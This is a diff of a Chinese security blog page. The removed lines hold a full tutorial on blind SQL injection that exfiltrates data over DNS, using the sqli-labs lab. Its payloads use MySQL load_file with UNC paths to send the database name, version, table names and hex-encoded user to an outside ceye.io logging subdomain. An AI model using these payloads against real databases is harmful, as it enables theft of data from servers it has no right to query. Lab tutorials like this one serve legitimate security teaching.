@@ -3,37 +3,19 @@
 <head>
     <meta charset="utf-8">
     
-    <title>SQL注入奇淫技巧——利用dnslog获取看不到的信息 | 披着羊皮的狼</title>
+    <title>Tag: XSS | 披着羊皮的狼</title>
     
     
-        <meta name="keywords" content="sql注入" />
+        <meta name="keywords" content="披着羊皮的狼" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="对于sql盲注，常用的方法应该是二分法了，为此之前还写过通过二分法猜解的半自动化python脚本，说实话，python脚本比起手动真的已经是好多了，可是我内心其实还是挺怵写脚本的，而且这种脚本二分法猜解发送的请求频繁麻烦不说，还容易被waf检测到，以至于ip被封。于是最近学习了一种sql盲注的奇淫技巧。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入奇淫技巧——利用dnslog获取看不到的信息">
-<meta property="og:url" content="http://zzqsmile.top/2018/06/18/web%E5%AE%89%E5%85%A8/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/index.html">
+    <meta property="og:type" content="website">
+<meta property="og:title" content="披着羊皮的狼">
+<meta property="og:url" content="http://zzqsmile.top/tags/XSS/index.html">
 <meta property="og:site_name" content="披着羊皮的狼">
-<meta property="og:description" content="对于sql盲注，常用的方法应该是二分法了，为此之前还写过通过二分法猜解的半自动化python脚本，说实话，python脚本比起手动真的已经是好多了，可是我内心其实还是挺怵写脚本的，而且这种脚本二分法猜解发送的请求频繁麻烦不说，还容易被waf检测到，以至于ip被封。于是最近学习了一种sql盲注的奇淫技巧。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/7jeek89Beb.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/1AD7h6Dhig.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/IA92AjLL1k.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/350KcDel4E.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/9LCCgi07i1.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/Cf44l1356a.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/gH07a18lII.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/8H3bFCi1fL.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180618/4ji3hAiliE.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180626/ghjGjF4bIc.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180626/BDCB67HKGI.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="og:image" content="http://qiniuyun.zzqsmile.top/blog/180626/1mk7jm6c3h.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
-<meta property="article:published_time" content="2018-06-18T01:00:00.000Z">
-<meta property="article:modified_time" content="2020-10-18T08:00:14.562Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://qiniuyun.zzqsmile.top/blog/180618/7jeek89Beb.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim">
     
 
     
@@ -246,27 +228,27 @@
                          <ul class="unstyled" id="tree" >  <li class="file"><a href="/2017/12/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-01-kali-arpspoof/">使用kali-arpspoof工具进行中间人arp投毒</a></li>  <li class="file"><a href="/2017/12/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-02-kali-wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B/">kali下wifi破解密码教程</a></li>  <li class="file"><a href="/2017/12/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-03-wireshark/">wireshark抓包过滤规则</a></li>  <li class="file"><a href="/2017/12/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-04-nessus%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">nessus安装教程</a></li>  <li class="file"><a href="/2017/12/05/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2017-12-05-sublime%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/">Sublime安装汉化教程</a></li>  <li class="file"><a href="/2018/06/04/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/2018-06-04-burp%E5%AE%89%E8%A3%85sqlmap%E6%A8%A1%E5%9D%97/">burpsuite安装sqlmap模块---神器合一</a></li>  <li class="file"><a href="/2018/06/05/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/burpsuite%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/">burpsuite使用教程</a></li>  <li class="file"><a href="/2019/04/06/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">sqlmap使用指南</a></li>  <li class="file"><a href="/2019/08/20/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msf/">msf安装使用教程</a></li>  </ul> 
                     </li> 
                     
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
-                            <i class="fa fa-folder-open"></i>
+                            <i class="fa fa-folder"></i>
                             &nbsp;
                             web安全
                         </a>
                          <ul class="unstyled" id="tree" > 
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
-                            <i class="fa fa-folder-open"></i>
+                            <i class="fa fa-folder"></i>
                             &nbsp;
                             SQL注入
                         </a>
                          <ul class="unstyled" id="tree" > 
-                    <li class="directory open">
+                    <li class="directory">
                         <a href="#" data-role="directory">
-                            <i class="fa fa-folder-open"></i>
+                            <i class="fa fa-folder"></i>
                             &nbsp;
                             MYSQL
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/04/01/web%E5%AE%89%E5%85%A8/sqli-labs-Less1/">sqli-labs Less-1</a></li>  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/">mysql报错注入原理分析之floor()</a></li>  <li class="file active"><a href="/2018/06/18/web%E5%AE%89%E5%85%A8/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/">SQL注入奇淫技巧——利用dnslog获取看不到的信息</a></li>  <li class="file"><a href="/2018/11/12/web%E5%AE%89%E5%85%A8/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">Order by排序注入方法小总结</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/04/01/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sqli-labs-Less1/">sqli-labs Less-1</a></li>  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B9%8Bfloor/">mysql报错注入原理分析之floor()</a></li>  <li class="file"><a href="/2018/06/18/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/">SQL注入奇淫技巧——利用dnslog获取看不到的信息</a></li>  <li class="file"><a href="/2018/11/12/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/Order_by%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E5%B0%8F%E6%80%BB%E7%BB%93/">Order by排序注入方法小总结</a></li>  </ul> 
                     </li> 
                      </ul> 
                     </li> 
@@ -275,9 +257,18 @@
                         <a href="#" data-role="directory">
                             <i class="fa fa-folder"></i>
                             &nbsp;
+                            XSS
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/">XSS Bypass</a></li>  <li class="file"><a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Payload/">XSS Payload</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
                             XXE
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/">XXE漏洞笔记</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2019/08/19/web%E5%AE%89%E5%85%A8/XXE/XXE/">XXE漏洞笔记</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -286,7 +277,7 @@
                             &nbsp;
                             文件上传/解析
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件上传解析漏洞总结</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2018/06/06/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">文件上传解析漏洞总结</a></li>  </ul> 
                     </li> 
                      <li class="file"><a href="/2019/04/04/%E4%BC%A0%E9%80%81%E9%97%A8/CORS/">跨域资源共享CORS</a></li>  </ul> 
                     </li> 
@@ -433,222 +424,86 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-web安全/sql盲注奇淫技巧之dnslog" class="article article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-        
-            <header class="article-header">
-                
-                    <div class="article-meta">
-                        
-    <div class="article-category">
-    	<i class="fa fa-folder"></i>
-        <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/MYSQL/">MYSQL</a>
+            <section id="main">
+<div class="timeline timeline-wrap">
+    <div class="timeline-row timeline-row-major">
+        <span class="node"><i class="fa fa-tag"></i></span>
+        <h1 class="title">#XSS</h1>
     </div>
-
-                        
-    <div class="article-tag">
-        <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a>
-    </div>
-
-                        
-    <div class="article-date">
-        <i class="fa fa-calendar"></i>
-        <a href="/2018/06/18/web%E5%AE%89%E5%85%A8/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/">
-            <time datetime="2018-06-18T01:00:00.000Z" itemprop="datePublished">2018-06-18</time>
-        </a>
-    </div>
-
-
-                        
-                            <i class="fa fa-bar-chart"></i>
-                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
-                        
-                        
-                            <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/raw/writing/source/_posts/web安全/sql盲注奇淫技巧之dnslog.md'> Source </a>
-                            </div>
-                            <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/edit/writing/source/_posts/web安全/sql盲注奇淫技巧之dnslog.md'> Edit </a>
-                            </div>
-                            <div class="article-meta-button">
-                                <a target="_blank" rel="noopener" href='https://github.com/zzqsmile/Wiki-site/commits/writing/source/_posts/web安全/sql盲注奇淫技巧之dnslog.md'> History </a>
-                            </div>
-                        
-                    </div>
-                
+    
+        <div class="timeline-row">
+            <span class="node"></span>
+            <div class="content">
                 
     
-        <h1 class="article-title" itemprop="name">
-            SQL注入奇淫技巧——利用dnslog获取看不到的信息
+        <h1 itemprop="name">
+            <a class="timeline-article-title" href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/">XSS Bypass</a>
         </h1>
     
 
-            </header>
-        
-        
-        <div class="article-entry" itemprop="articleBody">
-        
-        
-            
-        
-        
-            <blockquote>
-<p>对于sql盲注，常用的方法应该是二分法了，为此之前还写过通过二分法猜解的半自动化python脚本，说实话，python脚本比起手动真的已经是好多了，可是我内心其实还是挺怵写脚本的，而且这种脚本二分法猜解发送的请求频繁麻烦不说，还容易被waf检测到，以至于ip被封。于是最近学习了一种sql盲注的奇淫技巧。</p>
-</blockquote>
-<a id="more"></a>
-
-<h5 id="step1-介绍CEYE平台"><a href="#step1-介绍CEYE平台" class="headerlink" title="step1. 介绍CEYE平台"></a>step1. 介绍CEYE平台</h5><p>网址：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
-<ul>
-<li>点击进去注册一个帐号，这个平台应该是知道创宇的，因为之前注册过，所以这我直接登录即可，大家注册完毕应该和我一样如下图所示：</li>
-</ul>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/7jeek89Beb.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<ul>
-<li><p>注册完之后会自动的在一级域名<code>ceye.io</code>下分配一个二级域名如<code>xxxxx.ceye.io</code></p>
-<blockquote>
-<p>一级域名是要钱的也是人家的，二级域名就不要钱了，你注册一个帐号，它可以给你分配一个二级域名，这个大家应该知道吧，给大家提点一下，希望有助于大家理解.</p>
-</blockquote>
-</li>
-<li><p>在这儿，我只给大家简单说一下，这个平台注册完之后你可以理解其为自己的一台dns服务器吧，当你访问你的域名或者有HTTP请求时候，这个地方会记录你访问的日志，要是不明白看如下图示：</p>
-</li>
-</ul>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/1AD7h6Dhig.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<ul>
-<li>下面通过一个简单操作，再次有助大家理解</li>
-</ul>
-<blockquote>
-<p>比如浏览器访问<a target="_blank" rel="noopener" href="http://zzqsmile.xxxxx.ceye.io/">http://zzqsmile.xxxxx.ceye.io/</a>，如下图所示：</p>
-</blockquote>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/IA92AjLL1k.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<ul>
-<li>然后回头看<code>CEYE</code>，记得<code>reload</code>刷新一下</li>
-</ul>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/350KcDel4E.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<blockquote>
-<p>此时我相信你已经理解这个平台的作用了吧，其实就是一个dns解析服务器，只不过只能访问<code>xxxxx.ceye.io</code>及其子域名，才会产生dns日志而已。其他的暂不解释，接着我们今天要将的SQL盲注奇淫技巧。</p>
-</blockquote>
-<h5 id="step2-load-file-filename-函数"><a href="#step2-load-file-filename-函数" class="headerlink" title="step2. load_file(filename)函数"></a>step2. load_file(filename)函数</h5><blockquote>
-<p>相信学习过通过sql注入读写服务器文件的对这个函数应该不陌生，在这我再简单提一下这个函数的作用。</p>
-</blockquote>
-<ul>
-<li><p>load_file(filename)读取文件并返回文件内容为字符串.使用此函数需要满足以下条件: (1).所读文件必须在服务器上，且必须指定文件其绝对路径 (2).连接当前数据库用户必须有FILE权限 (3).文件内容必须小于max_allowed_packet。</p>
-</li>
-<li><p>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
-</li>
-</ul>
-<blockquote>
-<p>实际上load_file()函数还可以用来发送dns解析请求，接下来就实际尝试一下。</p>
-</blockquote>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/9LCCgi07i1.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<ul>
-<li>利用的payload是</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;))</span><br></pre></td></tr></table></figure>
-
-<p>database()就是要做sql注入查询的地方。<br>concat是字符串拼接<br>后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</p>
-<blockquote>
-<p>上面拼接的结果就是’\\\\ schema_name.XXXX.ceye.io\\abc’，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了</p>
-</blockquote>
-<h5 id="step3-sqli-labs靶场练习"><a href="#step3-sqli-labs靶场练习" class="headerlink" title="step3. sqli-labs靶场练习"></a>step3. sqli-labs靶场练习</h5><ul>
-<li>sqli-labs/第五关就是sql盲注，就拿这个来练习一下今天学的这个奇淫技巧吧。<br>payload:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取当前数据库</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>获取数据库版本</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/Cf44l1356a.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<p>-获取数据库<code>security</code>中的表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/gH07a18lII.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<blockquote>
-<p>值得说的是，这种方法不能同时查询多个结果，因此需要使用<code>limit</code>来控制每次查询一条结果。</p>
-</blockquote>
-<ul>
-<li>当然此时有人可能疑问到底有多少张表呢？没错使用<code>count()</code>，我尝试一下是可以查询到有几张表的。如下所示：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),&#39;.xxxxx.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/8H3bFCi1fL.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<ul>
-<li>同理查询字段也类似而已，但是经本人测试，查询<code>user()</code>时候就没查询出来。这是为什么呢? 因为<code>select user()</code>查询到的是<code>root@localhost</code>这样在url里面就变成了<a target="_blank" rel="noopener" href="http://root@localhost.xxxxx.ceye.io/">http://root@localhost.xxxxx.ceye.io/</a>，显然这样的url不是我们想要的，因为里面有特殊字符<code>@</code>，这样访问的时候就会将<code>root</code>当成用户名，来访问<code>localhost.xxxxx.ceye.io/</code>站点,这点不懂的需要去了解一下URL的组成。正如下图所示：</li>
-</ul>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180618/4ji3hAiliE.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<blockquote>
-<p>那么现在明白为什么查询<code>user()</code>查询不到了吧，而我现在找到的解决办法是将查询的结果通过base64编码输出出来，但是这个需要mysql版本大于<code>5.6.1</code>才能使用<code>to_base64()</code>编码函数，而我现在的数据库版本是<code>5.5.53</code>，无奈再次就不再演示了，顺便在说下base64解码函数<code>from_base64()</code></p>
-</blockquote>
-<ul>
-<li>至于mysql版本小于<code>5.6.1</code>就没办法了吗？我现在能想到的就是先查询字符串结果的长度，然后通过一个一个拆分，将其ascii编码，然后查询到我们在解码，最后拼接得到结果。虽然麻烦，还好一般字符串不会太长。以后有时间有更好的方法再分享吧。</li>
-</ul>
-<blockquote>
-<p>好了，今天的奇淫技巧就到这，大家没事也可以尝试尝试，总结总结，不过友情提示：今天这个奇淫技巧对与window服务器是没问题的，但是Linux服务器貌似不行，至于是什么原因，好像是由于<code>unc</code>的缘故，大家可以去Google或者百度一下<code>unc</code>,笔者有时间也会再去深入研究其原因和其局限性，到时候再更新补充吧。</p>
-</blockquote>
-<h5 id="step4-后续"><a href="#step4-后续" class="headerlink" title="step4 后续"></a>step4 后续</h5><ul>
-<li><p>之前说使用dnslog查询的有的内容是不能带入URL的，后来也没想到办法，但是后来有想到可以将查询到的内容进行<code>hex()</code>十六进制编码再带进URL里面访问，这样我们就能在dnslog里面看到我们查询到的信息了，不过看到的是十六进制编码内容，我们在将其解码即可。</p>
-</li>
-<li><p>下面一个简单的例子学习以下这个姿势</p>
-</li>
-</ul>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180626/ghjGjF4bIc.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user())),&#39;.k3i80p.ceye.io\\abc&#39;))),1,1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180626/BDCB67HKGI.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<p>将查询数据hex()解密一下看看，nice，没错是root@locakhost</p>
-<p><img src="http://qiniuyun.zzqsmile.top/blog/180626/1mk7jm6c3h.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-
-            </div>
-        
-        <footer class="article-footer">
-        </footer>
+                <div class="article-meta">
+                    
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2020/10/18/web%E5%AE%89%E5%85%A8/XSS/XSS%20Bypass/">
+            <time datetime="2020-10-18T12:00:00.000Z" itemprop="datePublished">2020-10-18</time>
+        </a>
     </div>
-</article>
 
 
-    
-<nav id="article-nav">
-    
